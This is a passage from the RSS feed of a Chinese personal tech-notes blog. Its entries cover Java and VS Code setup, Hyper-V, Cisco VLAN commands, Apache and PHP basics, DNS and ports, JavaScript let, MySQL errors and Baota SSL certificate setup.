在这个仓库中，你可以上传文件或添加文件，并且可以直接编辑部分文档文件，比如 html、txt 等等，当你每次对这个仓库中的内容进行修改时，你都可以提交修改信息，比如你这次对文件做了哪些修改等等，这类似与备注。</description>
    </item>
    
    <item>
      <title>Vs Code 配置 Java</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/vs-code-%E9%85%8D%E7%BD%AE-java/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/vs-code-%E9%85%8D%E7%BD%AE-java/</guid>
      <description>Vs Code 配置 Java 安装 vscode 安装 JDK 配置系统环境变量 打开系统系统环境变量配置界面   右击此电脑
  属性
  高级系统设置
  高级选项卡
  环境变量
  系统变量
  新建 JAVA_HOME 变量  变量名：JAVA_HOME。 值为：Java JDK 的安装路径。 确定  找到已存在的名为 Path 的变量  编辑 新建 输入：%JAVA_HOME%\jre\bin，确定 再新建，输入：%JAVA_HOME%\bin，确定 保存即可  新建 Classpath 变量   变量名：Classpath，
  值为：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;
  测试环境配置是否成功 快捷键 Win + R，搜索 cmd 并 Enter，然后在命令行输入java以及javac.
安装 vs code 扩展 java extension pack。</description>
    </item>
    
    <item>
      <title>安装 Hyper V</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/%E5%AE%89%E8%A3%85-hyper-v/</link>
      <pubDate>Sat, 02 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/%E5%AE%89%E8%A3%85-hyper-v/</guid>
      <description>安装 Hyper V 安装 hyper v
在第一台上链接第二台虚拟计算机
启动 nat 模式 8
关闭两台计算机的防火墙，更改高级设置，启用网络网络发现，关闭密码共享
第一太 ping 第二台计算机的 ip 地址，成功即可
查询
开远程权限
新建虚拟机
位置和名称
指定代数，32 位系统选第一代 64 位系统选第二代
分配内存，1024
网络连接，intel 8257
大小，25gb
以后安装操作系统
最后链接虚拟机
右击虚拟机
检查点
将虚拟机导出到文件夹，到处后就可以在操作界面进行导入虚拟机，创建新标识符
安装操作系统
文件，设置 ，固件，dvd 放到第一个，安装完成后，关机再将硬盘放到第一个。
关机，添加新硬盘，开机，计算机管理，磁盘管理，新建一个本地磁盘。
hyper v 设置，实时迁移，启用迁移
移动虚拟机，将虚拟机移动到新建的磁盘上即可
允许链接共享
在 hyper v 上新建磁盘，固定大小动态扩展，下一步，完成</description>
    </item>
    
    <item>
      <title>Cisco Vlan</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/vlan/</link>
      <pubDate>Sun, 12 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/vlan/</guid>
      <description>Vlan 重命名 Vlan enable configure terminal vlan 10 name MyVlan 删除 Vlan 分配 enable configure terminal interface f 0/18 no switchport access vlan 删除 Vlan no vlan 20 配置 Vlan 的 IP enable configure terminal interface vlan 1 ip address 192.168.10.1 255.255.255.0 </description>
    </item>
    
    <item>
      <title>如何提高文笔</title>
      <link>https://note.yxzi.xyz/note/technology/writing/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%96%87%E7%AC%94/</link>
      <pubDate>Mon, 06 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/writing/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%96%87%E7%AC%94/</guid>
      <description>如何提高文笔 经常阅读
随时记录灵感。
写文章第一天先把想写的写下来，连系段落随意写下。
第二天把文章大体全部梳理写一遍。
第三天重复精简修词。隔一天再审一遍
画面感 1） 静画面中突出具体特质，如颜色、形状、质感、味道等等。
2） 动静反衬。即静画面中突出动的，或动画面中突出伫立不动的。
尽可能少用“的”
视觉美感 是带有情绪的想象，用最少的文字，传递出最多元的信息
词汇本身就极具美感和意境
建立素材库，随机搭配
情感落点 越想表达什么感情，越不说。欲言又止、欲走还留。</description>
    </item>
    
    <item>
      <title>PHP</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/php/</link>
      <pubDate>Sat, 30 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/php/</guid>
      <description>PHP PHP 是一种运行在服务器端的脚本语言。
PHP Hyper text Pxeprosessor, php. 超文本预处理器，底层使用 C 语言。
所支持的数据库有：Sqlservex、Mysql、Oracle、Access</description>
    </item>
    
    <item>
      <title>安装 Apache</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%AE%89%E8%A3%85-apache/</link>
      <pubDate>Thu, 07 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%AE%89%E8%A3%85-apache/</guid>
      <description>安装 Apache 官方下载地址Apache 进不去的话，就挂个 VPN，下载好后解压，我们会得到一个名为 Apache24 的文件夹，我们先将这个文件夹放到你想要放置的目录，我这里是D:\AppInstallPath\Apache24.
目录文件解析 bin 和 cgi -bin 文件夹是 windows 下的一些可执行文件。
conf 文件夹是 Apache 的配置文件目录。
error 文件夹是 Apache 的错误日志。
htdoce 文件夹是 Apache 的默认主机地址（网站的根目录文件，默认为 index）。
modules 文件夹是 Apache 的模块，Apache 的所有功能都是模块化的，你想要什么功能，就可以在配置文件中去加载对应功能的模块（so 后缀的文件）
bin 文件夹解析 ab.exe 是提供压力测试（当很多人访问你的网站时，你的网站是否能承载）的一个程序。
ApacheMonitor.exe 是管理右下角最小化的图标的。
httpd.exe 很重要。
conf 文件夹解析 httpd.conf 是主配置文件。
extra 文件夹中都是子配置文件（比如 httpd-vhosts.conf），当我们需要用这些子配置文件的时候，我们需要到主配置中文件中去加载这些子配置文件。
Httpd.exe 代表着服务器的进程，它运行之后，服务器才能运行。</description>
    </item>
    
    <item>
      <title>网站访问流程</title>
      <link>https://note.yxzi.xyz/note/technology/internet/%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E6%B5%81%E7%A8%8B/</link>
      <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E6%B5%81%E7%A8%8B/</guid>
      <description>网站访问流程 静态网站  通过电脑打开浏览器输入 URL（资源的绝对路径），比如https://yxzi.xyz/:80/index.html DNS 服务器，先找本地 DNS（本地 hosts 文件），再找网络 DNS ，然后将域名（https://yxzi.xyz/）解析为 IP（192.168.1.0:80/index.html），最后将解析出来的 IP 返回给浏览器。 浏览器通过 IP（192.168.1.0:80/index.html）找到服务器， 再通过端口（80）找到服务器上的服务软件 Apache。 通过 Apache，就可以得到 一个 URI（资源都相对路径），Apache 根据这个 URI（/index.html），即可获取到服务器上文件名为 index.html 的文件。 Apache 会读取这个文件中的数据，并将最终结果返回给浏览器，反之，如果服务器上的文件不存在，那么浏览器会返回给浏览器一个错误，比如 404（链接所指向的网页不存在） 错误。 浏览器得到 Apache 返回的数据之后，它会解析这些数据，并将这些数据以某种方式呈现给用户。  动态网站  通过电脑打开浏览器输入 URL（资源的绝对路径），比如https://yxzi.xyz/:80/index.pnh DNS 服务器，先找本地 DNS（本地 hosts 文件），再找网络 DNS ，然后将域名（https://yxzi.xyz/）解析为 IP（192.168.1.0:80/index.php），最后将解析出来的 IP 返回给浏览器。 浏览器通过 IP（192.168.1.0:80/index.php）找到服务器， 再通过端口（80）找到服务器上的服务软件 Apache Apache 就可以得到 一个 URI（资源都相对路径），Apache 根据这个 URI（/index.php），即可获取到服务器上文件名为 index.php 的文件。 但又因为网站是动态的，所以 Apache 是无法识别后缀为 PHP 的文件的，因此在这里需要一个叫 PHP 引擎的东西，Apache 将 这个 PHP 文件交给 PHP 引擎，PHP 引擎读取 PHP 文件之后，需要将这个文件解析为 html 文件 ，注意，这时的 PHP 引擎可能会去寻找数据库，并对数据库进行一些操作（读取、放入、修改数据库等等）。最后，PHP 引擎会将解析后的 HTML 数据（PHP 文件中的数据和数据库中的数据），全部返回给 Apache。 Apache 会读取 PHP 引擎返回的内容，并将最终结果返回给浏览器，反之，如果服务器上的文件不存在，那么浏览器会返回给浏览器一个错误，比如 404（链接所指向的网页不存在） 错误。 浏览器得到 Apache 返回的数据之后，它会解析这些数据，并将这些数据以某种方式呈现给用户。  </description>
    </item>
    
    <item>
      <title>DNS 和端口</title>
      <link>https://note.yxzi.xyz/note/technology/internet/dns-%E5%92%8C%E7%AB%AF%E5%8F%A3/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/dns-%E5%92%8C%E7%AB%AF%E5%8F%A3/</guid>
      <description>DNS 和端口 DNS DNS 是互联网的一项服务，它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。
简单的讲 DNS 就是翻译官，比如它会将http://www.baidu.com翻译成220.181.111.188让机器理解。
DNS 有什么用 DNS 是用来做域名解析的，它会在你上网输入网址后，把它转换成 IP，然后去访问这个 IP 所指定的服务器，没有它，你想上百度就要记住百度的 IP，上 163 就要记住 163 的 IP，有了 DNS 的处理，你只需要记住对应网站的域名（网址），比如https://yxzi.xyz/。
DNS 是一个按层次结构排列的分布式系统，由许多 DNS 服务器组成。DNS 服务器是注册加入 DNS 的任何计算机。它具有域名和 IP 地址的索引，并且在请求时，它可以告诉你与域名关联的当前 IP 地址。
如果它不知道，那么它将尝试从其他 DNS 服务器中找出。
因此，当您在浏览器中键入域名时，浏览器会询问 DNS 服务器该域的 IP 地址是什么，DNS 服务器会尝试告诉你。
端口 简单来说：
 在一台计算机上，端口用来指定你想要访问这台物理设备上的哪个程序。
 IP 能锁定一台物理机器，对应着一张网卡，网卡会接收外界发来的数据包。但是问题来了，网卡给程序提供了接口，你监听一下我，要是有消息来了，我就转发给你，这样应用程序就能收到数据了。
但是问题来了，程序 A 和程序 B 都需要监听网卡接发数据，网卡说那我把接到的数据都发给你两，你们自己看着办吧。
好，小 A 小 B 都接收了。
但是又来了 CDEF&amp;hellip;&amp;hellip;，不行了，每个包都被发到了所有应用程序，每个应用程序都累得不行，最终垮了。
好，那网卡说我给你们加个表示吧，我们之间可以用一个号码来作为标识，我和小 A 之间就用 1 来标识，
如果外界发给 1 号标识的数据我就转发给你，你监听我的时候得告诉我你监听的是 1，我就转发 1 的数据包给你。</description>
    </item>
    
    <item>
      <title>IP 和域名</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ip-%E5%92%8C%E5%9F%9F%E5%90%8D/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ip-%E5%92%8C%E5%9F%9F%E5%90%8D/</guid>
      <description>IP 和域名 IP IP 具有唯一性，像人的身份证一样，是唯一的。
通俗地讲就是互联网世界的门牌号，通过 IP 地址就可以准确无误的找到某台计算机的位置，它具有唯一性，所以当我们访问某个 IP 的时候才不会出现错误，他就像我们的身份证号码那样独一无二，我们可以和别人同名，但是绝不可能和别人有同样的身份证号码。
首先要确定你的 IP 地址是否是以 192.168 开头，如果是这个地址的话，不需要担心。这是内网的 IP 地址，在外网是无法直接访问的。如果不是内网的地址，有可能会遭到黑客的攻击。这需要一定的专业技术，普通人很难进行攻击，而且你的电脑应该需要有很强的利用价值，才会让人费时费力对你发起攻击之心，所以知道你 IP 对于大多数人来说不能对你做什么。
域名 IP 不方便我们记忆，而域名，则是为了我们更好的记忆某一个网站的地址。
域名（Domain Name）是由一串字符组成的，它指向某一个具体的 IP 地址。</description>
    </item>
    
    <item>
      <title>服务器</title>
      <link>https://note.yxzi.xyz/note/technology/internet/%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>服务器 在网络环境下，根据服务器提供的服务类型不同，分为文件服务器，数据库服务器，应 用程序服务器，WEB 服务器等。
一台个人计算机也可以成为一台服务器，只要这台计算机可以提供服务，那么，如何让这台计算机提供服务呢？
只需要在这台计算机上安装可以提供服务的软件（服务软件）。
比如一台 Web 服务器，它如果要提供 Web 服务（网站访问），就需要安装 Web 服务软件，Apache，Tomcat， Iis 等等
服务器是网站的灵魂，是打开网站的必要载体，没有服务器的网站用户无法浏览。服务器就像一块敲门砖，就算网站在搜索引擎里的排名再好，网站打不开，用户无法浏览，网站就没有用户体验可言，网站能被打开是第一个重点。
提到服务器对于电脑爱好者来说一定不陌生，一般我们很难看到真正的服务器，因为服务器一般均放置在机房重点，闲人一般均是免进的，所以说起服务器，好多未接触的朋友都觉的很陌生，介于此，斯百德就为不明白服务器是什么的小伙伴们，揭开服务器神秘的面纱。
其实服务器的模样就和电脑的主机很相似，但是服务器是网站的灵魂，是打开网站的必要载体，没有服务器的网站用户无法浏览。服务器就像一块敲门砖，就算网站在搜索引擎里的排名再好，网站打不开，用户无法浏览，网站就没有用户体验可言，网站能被打开是第一个重点。比如我们每天浏览的网站，其实数据均在服务器，服务器一般都在一些 IDC 数据中心机房以及电信等网络大厦里面。
服务器，也称伺服器。服务器是网络环境中的高性能计算机，它侦听网络上的其他计算机（客户机）提交的服务请求，并提供相应的服务，为此，服务器必须具有承担服务并且保障服务的能力。我们这里提到的服务器，主要是指的 Web 服务器，我们也称之为专用服务器，是专为网站业务应用的服务器，这种服务器可以向发出请求的浏览器提供文档的程序。Web 服务器也是一种被动的程序，只有当服务器接收到浏览器发出的请求时，服务器才会响应。
由于Web 服务器是一种被动的程序，所以不同类型的网站对 Web 服务器的要求差别很大。企业网站和个人网站一般都是展示型网站，所以他们对服务器的性能要求一般都不高。电子商务型网站以及门户型等网站一般访问量用户比较大，这些大型网站对服务器的需要则较高。
目前，用户使用最多的 web 服务器软件有两个：微软的信息服务器（iis）和 Apache。而架设 Web 服务器比较常见的操作系统有 Windows，Linux 和 Unix。Linux 的安全性在这三个系统中最高，同时可以支持多个硬件平台，而且其是开源软件，市场价格更低，甚至用户可以下载免费的代码来搭建 Web 服务器。Web 服务器的操作更简单，性能更优越，目前使用率非常的高，Unix 则比较小众！</description>
    </item>
    
    <item>
      <title>静态网站和动态网站</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E5%92%8C%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E5%92%8C%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99/</guid>
      <description>静态网站和动态网站 静态网站的特点  网页内容一经发布到网站服务器上，无论是否有用户访问，每个静态网页的内容都是保存在网站服务器上的,也就是说,静态网页是实实在在保存在服务器上的文件，每个网页都是一个独立的文件。 静态网页的内容相对稳定，因此容易被搜索引擎检索。 静态网页没有数据库的支持，在网站制作和维护方面工作量较大，因此当网站信息量很大时完全依靠静态网页制作方式比较困难。 静态网页的交互性较差，在功能方面有较大的限制，当我们要修改网页上文件时，需要将修改后的文件覆盖服务器上的源文件。  动态网站的特点  交互性强，网页会根据用户的要求和选择而动态地改变和响应，网页上的数据都是从数据库中获取的，并且用户的操作，也可以对网页上的数据进行实时的更新。 自动更新，即无须手动更新 HTmL 文档,便会自动生成新页面，可以大大节省工作量。 因时因人而变，在不同时间、不同用户访问用一个网址时，会出现不同页面。 在动态网页的网址中有一个标志性的符号“?”。  </description>
    </item>
    
    <item>
      <title></title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/let/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/let/</guid>
      <description>let 变量无法重复声明，避免变量污染。
块级作用域，变量只在当前代码块{}的作用域中有效，一个{}就是一个作用域。
{ 	let b = 1; } console.log(b); 但不影响作用域链。
a = 3; function fun() { 	console.log(a); } fun(); 不进行变量声明提升
console.log(a);let a = 1; </description>
    </item>
    
    <item>
      <title></title>
      <link>https://note.yxzi.xyz/note/technology/linux/%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/linux/%E5%91%BD%E4%BB%A4/</guid>
      <description>重置 root 用户密码
sudo passwd root </description>
    </item>
    
    <item>
      <title></title>
      <link>https://note.yxzi.xyz/note/technology/linux/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/linux/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/</guid>
      <description>pup 版本和</description>
    </item>
    
    <item>
      <title></title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/</guid>
      <description>SQLSTATE[HY000] [1045] Access denied for user &amp;#39;Gallery&amp;#39;@&amp;#39;localhost&amp;#39; (using password: YES) (SQL: SHOW FULL TABLES WHERE table_type = &amp;#39;BASE TABLE&amp;#39;) skip_grant_tables</description>
    </item>
    
    <item>
      <title></title>
      <link>https://note.yxzi.xyz/note/technology/%E5%AE%9D%E5%A1%94/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/%E5%AE%9D%E5%A1%94/</guid>
      <description>宝塔面板非常方便，其中免费的SSL一键申请部署也很方便。但是经常莫名其妙出现“域名待验证”，有时候过很久都不通过。
最近静下心来仔细研究了一下。才找到了其中的奥秘。
申请证书的验证方式有两种：FILE验证与DNS验证。
从宝塔面板中直接申请，走的是前者。这种验证方式有时候比较慢，这时，可以直接登录bt.cn，在SSL管理中申请证书，用DNS验证。
DNS验证需要按照&amp;quot;详情&amp;quot;中的要求，去域名解析的地方添加一条“TXT”记录。
完成后在命令行检验TXT记录是否生效，命令如下：
nslookup -qt=TXT yourdomain.com
若生效，会显示解析结果。若不生效，就要检查一下是否有相同的CNAME记录。 因为同名的CNAME记录与TXT记录是有冲突的！
为不影响使用，可以先将CNAME记录改为A记录，等确认TXT解析生效后，去bt.cn后台验证域名，很快就能通过了。
通过后，点开证书信息。
复制“证书密钥”填到宝塔面板对应的“密钥(KEY)”中。
复制“证书”填到塔面板对应的“证书(PEM格式)”中，再复制“根证书”追加其后。
保存。
大功告成！</description>
    </item>
    
    
    <item>
      <title>PHP 函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 形参默认值 定义函数时，指定形参的默认值。这个默认值会在调用该函数且并未传入实参的时候，当作该函数的默认实参传入。
function fun($a = 1) {  echo $a; } fun(); 可变函数 将定义好的函数名赋值给一个变量，然后通过这个变量来调用。
function sysFun($fun, $num) {  $num = $num + 10;  // 函数调用  return $fun($num); }  function userFun($num) {  return $num * $num * $num * $num; } echo sysFun(&amp;#39;userFun&amp;#39;, 10); </description>
    </item>
    
    <item>
      <title>PHP 操作数据库</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93/</guid>
      <description>操作数据库 // 链接数据库 $link = mysqli_connect(&amp;#39;localhost&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;123456&amp;#39;, &amp;#39;my_shop&amp;#39;, &amp;#39;3306&amp;#39;); if (!$link) {  exit(&amp;#39;数据库链接失败&amp;#39;); }  // 对数据库进行一次查询 $res = mysqli_query($link, &amp;#39;select * from hr_goods&amp;#39;);  // 获取查询结果中的所有字段，每个字段都是一个数组 while ($row = mysqli_fetch_array($res)) {  echo $row[1] . &amp;#39;、&amp;#39;; }  </description>
    </item>
    
    
  </channel>
</rss>
